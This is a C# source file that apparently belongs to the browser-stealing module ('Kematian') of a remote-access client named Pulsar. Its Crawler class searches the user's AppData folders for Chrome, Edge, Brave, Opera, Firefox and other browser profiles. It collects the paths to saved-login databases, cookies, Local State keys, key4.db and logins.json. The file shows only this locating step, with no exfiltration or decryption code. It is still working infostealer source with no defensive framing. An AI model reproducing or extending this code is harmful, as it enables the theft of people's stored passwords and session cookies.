using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian.Browsers.Helpers
{
    public class Crawler
    {
        private const int MAX_DEPTH = 4;
        private readonly string[] knownBrowserPaths = {
            @"Opera",
            @"Opera Software\Opera GX Stable",
            @"Google\Chrome",
            @"Google\Chrome SxS",
            @"Microsoft\Edge",
            @"BraveSoftware\Brave-Browser",
            @"Mozilla\Firefox",
            @"Yandex\YandexBrowser",
            @"Vivaldi",
            @"Chromium"
        };

        private readonly HashSet<string> skipDirectories = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            "temp", "cache", "logs", "thumbnails", "crash reports", "crashpad", 
            "webcache", "snapshots", "code cache", "service worker", "blob_storage",
            "system32", "windowsapps", "program files", "appdata", "$recycle.bin",
            "windows", "system volume information", "microsoft", "programdata",
            "nvidia", "amd", "intel", "drivers", "games", "updater", "installer"
        };

        private readonly string[] geckoProfFiles = {
            "key4.db",
            "logins.json",
            "cookies.sqlite",
            "places.sqlite",
            "permissions.sqlite",
            "prefs.js",
            "favicons.sqlite"
        };

        private readonly string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private readonly string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        
        private static List<BrowserChromium> cachedChromiumBrowsers;
        private static List<BrowserGecko> cachedGeckoBrowsers;
        private static readonly object cacheLock = new object();
        private static bool isCacheInitialized = false;

        public AllBrowsers FindAllBrowsers()
        {
            if (isCacheInitialized)
            {
                return new AllBrowsers
                {
                    Chromium = cachedChromiumBrowsers.ToArray(),
                    Gecko = cachedGeckoBrowsers.ToArray()
                };
            }

            lock (cacheLock)
            {
                if (isCacheInitialized)
                {
                    return new AllBrowsers
                    {
                        Chromium = cachedChromiumBrowsers.ToArray(),
                        Gecko = cachedGeckoBrowsers.ToArray()
                    };
                }

                var chromiumBrowsers = new List<BrowserChromium>();
                var geckoBrowsers = new List<BrowserGecko>();
                
                CheckKnownBrowserPaths(chromiumBrowsers, geckoBrowsers);

                string[] rootDirs = { localAppData, appData };
                
                foreach (var rootDir in rootDirs)
                {
                    if (Directory.Exists(rootDir))
                    {
                        Debug.WriteLine($"[INFO] Starting deep search in: {rootDir}");
                        if (rootDir == appData)
                        {
                            SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, true);
                        }
                        else
                        {
                            SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, false);
                        }
                    }
                }

                cachedChromiumBrowsers = chromiumBrowsers.OrderBy(b => b.Name).ToList();
                cachedGeckoBrowsers = geckoBrowsers.OrderBy(b => b.Name).ToList();
                isCacheInitialized = true;

                LogFoundBrowsers(cachedChromiumBrowsers, cachedGeckoBrowsers);

                return new AllBrowsers
                {
                    Chromium = cachedChromiumBrowsers.ToArray(),
                    Gecko = cachedGeckoBrowsers.ToArray()
                };
            }
        }

        private void CheckKnownBrowserPaths(List<BrowserChromium> chromiumBrowsers, List<BrowserGecko> geckoBrowsers)
        {
            string[] basePaths = { localAppData, appData };
            var allPaths = new List<string>();
            
            foreach (var basePath in basePaths)
            {
                foreach (var knownPath in knownBrowserPaths)
                {
                    allPaths.Add(Path.Combine(basePath, knownPath));
                }
            }

            foreach (var fullPath in allPaths.OrderBy(p => p))
            {
                if (Directory.Exists(fullPath))
                {
                    Debug.WriteLine($"[INFO] Checking known browser path: {fullPath}");
                    
                    bool isRoaming = fullPath.StartsWith(appData, StringComparison.OrdinalIgnoreCase);
                    
                    if (fullPath.Contains("Opera"))
                    {
                        CheckForOperaBrowser(fullPath, chromiumBrowsers);
                    }
                    else if (fullPath.Contains("Firefox"))
                    {
                        if (isRoaming)
                        {
                            CheckForGeckoBrowser(fullPath, geckoBrowsers);
                        }
                    }
                    else
                    {
                        CheckForBrowser(fullPath, chromiumBrowsers, geckoBrowsers, isRoaming);
                    }
                }
            }
        }

        private void SearchDirectory(string directory, List<BrowserChromium> chromiumBrowsers,
                                     List<BrowserGecko> geckoBrowsers, bool isRoaming, int depth = 0)
        {
            if (depth > MAX_DEPTH) return;

            try
            {
                string dirName = Path.GetFileName(directory).ToLowerInvariant();
                if (skipDirectories.Contains(dirName))
                {
                    return;
                }

                CheckForBrowser(directory, chromiumBrowsers, geckoBrowsers, isRoaming);

                var subDirs = Directory.GetDirectories(directory).OrderBy(d => d).ToList();
                
                foreach (var dir in subDirs)
                {
                    SearchDirectory(dir, chromiumBrowsers, geckoBrowsers, isRoaming, depth + 1);
                }
            }
            catch (UnauthorizedAccessException)
            {
                // Skip directories we don't have access to
            }
            catch (PathTooLongException)
            {
                // Skip paths that are too long
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] In directory {directory}: {ex.Message}");
            }
        }

        private void CheckForBrowser(string path, List<BrowserChromium> chromiumBrowsers,
                                          List<BrowserGecko> geckoBrowsers, bool isRoaming)
        {
            try
            {
                // Check for Chromium browsers
                string userDataPath = Path.Combine(path, "User Data");
                if (Directory.Exists(userDataPath))
                {
                    string localStatePath = Path.Combine(userDataPath, "Local State");
                    if (File.Exists(localStatePath))
                    {
                        Debug.WriteLine($"[DETECT] Found Chromium browser at: {userDataPath}");
                        var profiles = FindChromiumProfiles(userDataPath);

                        if (profiles.Count > 0)
                        {
                            lock (chromiumBrowsers)
                            {
                                chromiumBrowsers.Add(new BrowserChromium
                                {
                                    Name = Path.GetFileName(path),
                                    LocalState = localStatePath,
                                    Path = path,
                                    Profiles = profiles.ToArray()
                                });
                            }
                            Debug.WriteLine($"[SUCCESS] Added Chromium browser with {profiles.Count} profiles");
                        }
                    }
                }

                CheckForGeckoBrowser(path, geckoBrowsers);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Checking browser in {path}: {ex.Message}");
            }
        }

        private List<ProfileChromium> FindChromiumProfiles(string userDataPath)
        {
            var profiles = new List<ProfileChromium>();

            try
            {
                // Check root directory for Opera-style direct file storage
                TryAddChromiumProfile(profiles, userDataPath, "Root");

                // Check Default profile
                string defaultProfile = Path.Combine(userDataPath, "Default");
                if (Directory.Exists(defaultProfile))
                {
                    TryAddChromiumProfile(profiles, defaultProfile, "Default");
                }

                var profileDirs = Directory.GetDirectories(userDataPath)
                    .Where(dir => Path.GetFileName(dir).StartsWith("Profile ", StringComparison.OrdinalIgnoreCase))
                    .OrderBy(dir => {
                        string name = Path.GetFileName(dir);
                        if (name.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase) && 
                            name.Length > 8 && 
                            int.TryParse(name.Substring(8), out int profileNumber))
                        {
                            return profileNumber;
                        }
                        return 9999;
                    })
                    .ToList();

                foreach (var profileDir in profileDirs)
                {
                    TryAddChromiumProfile(profiles, profileDir, Path.GetFileName(profileDir));
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Finding Chromium profiles: {ex.Message}");
            }

            return profiles.OrderBy(p => p.Name).ToList();
        }

        private void TryAddChromiumProfile(List<ProfileChromium> profiles, string profileDir, string profileName)
        {
            try
            {
                // Create network subdirectory path - sometimes cookies are stored here
                string networkDir = Path.Combine(profileDir, "Network");
                string cookiesNetworkPath = Path.Combine(networkDir, "Cookies");
                string cookiesDirectPath = Path.Combine(profileDir, "Cookies");

                var profile = new ProfileChromium
                {
                    Name = profileName,
                    Path = profileDir,
                    LoginData = Path.Combine(profileDir, "Login Data"),
                    WebData = Path.Combine(profileDir, "Web Data"),
                    Cookies = File.Exists(cookiesNetworkPath) ? cookiesNetworkPath : cookiesDirectPath,
                    History = Path.Combine(profileDir, "History"),
                    Bookmarks = Path.Combine(profileDir, "Bookmarks")
                };

                // Count how many data files we have - browsers may use different combinations
                Dictionary<string, bool> fileStatuses = new Dictionary<string, bool>
                {
                    { "LoginData", File.Exists(profile.LoginData) },
                    { "WebData", File.Exists(profile.WebData) },
                    { "Cookies", File.Exists(profile.Cookies) },
                    { "History", File.Exists(profile.History) },
                    { "Bookmarks", File.Exists(profile.Bookmarks) }
                };

                int validFiles = fileStatuses.Count(kvp => kvp.Value);

                // Consider a profile valid if it has at least 2 of the expected files
                if (validFiles >= 2 && !profileDir.Contains("Application Data"))
                {
                    profiles.Add(profile);
                    Debug.WriteLine($"[SUCCESS] Added profile {profileName} with {validFiles}/5 data files");
                }
                else if (validFiles > 0)
                {
                    Debug.WriteLine($"[INCOMPLETE] Profile {profileName} has only {validFiles}/5 data files");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Adding Chromium profile {profileName}: {ex.Message}");
            }
        }

        private void CheckForGeckoBrowser(string path, List<BrowserGecko> geckoBrowsers)
        {
            try
            {
                // First check direct path for Gecko profile
                string dirName = Path.GetFileName(path);
                if (dirName.Contains(".default-") || dirName.EndsWith(".default") || 
                    ContainsGeckoProfileFiles(path))
                {
                    TryAddGeckoProfile(path, geckoBrowsers);
                }

                string profilesPath = Path.Combine(path, "Profiles");
                if (Directory.Exists(profilesPath))
                {
                    var defaultProfiles = Directory.GetDirectories(profilesPath)
                        .Where(dir => Path.GetFileName(dir).Contains(".default-") ||
                                      Path.GetFileName(dir).EndsWith(".default") ||
                                      ContainsGeckoProfileFiles(dir))
                        .ToList();

                    if (defaultProfiles.Count > 0)
                    {
                        foreach (var profileDir in defaultProfiles)
                        {
                            TryAddGeckoProfile(profileDir, geckoBrowsers);
                        }
                    }
                }

                string[] potentialProfileFolders = { "Browser", "browser", "profile", "Profiles", "Data" };
                foreach(var folder in potentialProfileFolders)
                {
                    string potentialDir = Path.Combine(path, folder);
                    if (Directory.Exists(potentialDir) && !potentialDir.Equals(profilesPath, StringComparison.OrdinalIgnoreCase))
                    {
                        if (ContainsGeckoProfileFiles(potentialDir))
                        {
                            TryAddGeckoProfile(potentialDir, geckoBrowsers);
                        }

                        try
                        {
                            var subDirs = Directory.GetDirectories(potentialDir);
                            foreach (var subDir in subDirs)
                            {
                                if (ContainsGeckoProfileFiles(subDir))
                                {
                                    TryAddGeckoProfile(subDir, geckoBrowsers);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"[ERROR] Checking subdirectories in {potentialDir}: {ex.Message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Checking Gecko browser in {path}: {ex.Message}");
            }
        }

        private bool ContainsGeckoProfileFiles(string directory)
        {
            if (!Directory.Exists(directory)) return false;

            int foundIndicators = 0;
            foreach (var indicator in geckoProfFiles)
            {
                if (File.Exists(Path.Combine(directory, indicator)))
                {
                    foundIndicators++;
                    if (foundIndicators >= 2)
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        private void TryAddGeckoProfile(string profileDir, List<BrowserGecko> geckoBrowsers)
        {
            try
            {
                string key4Path = Path.Combine(profileDir, "key4.db");
                string loginsPath = Path.Combine(profileDir, "logins.json");
                string cookiesPath = Path.Combine(profileDir, "cookies.sqlite");
                string historyPath = Path.Combine(profileDir, "places.sqlite");

                // Count valid files
                int validFiles = 0;
                if (File.Exists(key4Path)) validFiles++;
                if (File.Exists(loginsPath)) validFiles++;
                if (File.Exists(cookiesPath)) validFiles++;
                if (File.Exists(historyPath)) validFiles++;

                if (validFiles >= 1)
                {
                    string browserName = "Unknown Gecko";
                    
                    try
                    {
                        var parent = Directory.GetParent(profileDir);
                        if (parent != null)
                        {
                            if (parent.Name.Equals("Profiles", StringComparison.OrdinalIgnoreCase))
                            {
                                var grandParent = parent.Parent;
                                if (grandParent != null)
                                {
                                    browserName = grandParent.Name;
                                }
                            }
                            else
                            {
                                browserName = parent.Name;
                            }
                        }
                    }
                    catch
                    {
                        browserName = Path.GetFileName(profileDir);
                    }

                    // When adding browsers, use a lock to ensure thread safety
                    lock (geckoBrowsers)
                    {
                        geckoBrowsers.Add(new BrowserGecko
                        {
                            Name = browserName,
                            Path = profileDir,
                            Key4 = key4Path,
                            Logins = loginsPath,
                            Cookies = cookiesPath,
                            History = historyPath,
                            ProfilesDir = Directory.GetParent(profileDir)?.FullName ?? profileDir
                        });
                    }

                    Debug.WriteLine($"[SUCCESS] Added Gecko profile '{browserName}' with {validFiles}/4 data files");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Adding Gecko profile: {ex.Message}");
            }
        }

        private void CheckForOperaBrowser(string path, List<BrowserChromium> chromiumBrowsers)
        {
            try
            {
                var profiles = new List<ProfileChromium>();
                TryAddChromiumProfile(profiles, path, "Default");

                if (profiles.Count > 0)
                {
                    lock (chromiumBrowsers)
                    {
                        chromiumBrowsers.Add(new BrowserChromium
                        {
                            Name = "Opera",
                            LocalState = Path.Combine(path, "Local State"),
                            Path = path,
                            Profiles = profiles.ToArray()
                        });
                    }
                    Debug.WriteLine($"[SUCCESS] Added Opera browser with {profiles.Count} profiles");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Checking Opera browser in {path}: {ex.Message}");
            }
        }

        private bool IsSystemDirectory(string dirName)
        {
            string lower = dirName.ToLowerInvariant();
            return lower == "crash reports" || lower == "gcm_store" ||
                   lower == "cache" || lower == "session storage" ||
                   lower == "jumplisticons" || lower.StartsWith(".");
        }

        private void LogFoundBrowsers(List<BrowserChromium> chromiumBrowsers,
                                           List<BrowserGecko> geckoBrowsers)
        {
            Debug.WriteLine("========== FOUND CHROMIUM BROWSERS ==========");
            foreach (var browser in chromiumBrowsers)
            {
                Debug.WriteLine($"[BROWSER] {browser.Name}: {browser.Path}");
                Debug.WriteLine($"[LOCAL_STATE] {browser.LocalState}");

                foreach (var profile in browser.Profiles)
                {
                    Debug.WriteLine($"  [PROFILE] {profile.Name}");
                    Debug.WriteLine($"    LoginData: {FileExistsInfo(profile.LoginData)}");
                    Debug.WriteLine($"    WebData: {FileExistsInfo(profile.WebData)}");
                    Debug.WriteLine($"    Cookies: {FileExistsInfo(profile.Cookies)}");
                    Debug.WriteLine($"    History: {FileExistsInfo(profile.History)}");
                    Debug.WriteLine($"    Bookmarks: {FileExistsInfo(profile.Bookmarks)}");
                }
                Debug.WriteLine("-------------------------------------------");
            }

            Debug.WriteLine("========== FOUND GECKO BROWSERS ==========");
            foreach (var browser in geckoBrowsers)
            {
                Debug.WriteLine($"[BROWSER] {browser.Name}: {browser.Path}");
                Debug.WriteLine($"[PROFILES_DIR] {browser.ProfilesDir}");
                Debug.WriteLine($"  Key4DB: {FileExistsInfo(browser.Key4)}");
                Debug.WriteLine($"  LoginsJson: {FileExistsInfo(browser.Logins)}");
                Debug.WriteLine($"  Cookies: {FileExistsInfo(browser.Cookies)}");
                Debug.WriteLine($"  History: {FileExistsInfo(browser.History)}");
                Debug.WriteLine("-------------------------------------------");
            }
        }

        private string FileExistsInfo(string path)
        {
            return $"{path} ({(File.Exists(path) ? "Found" : "Missing")})";
        }
    }
}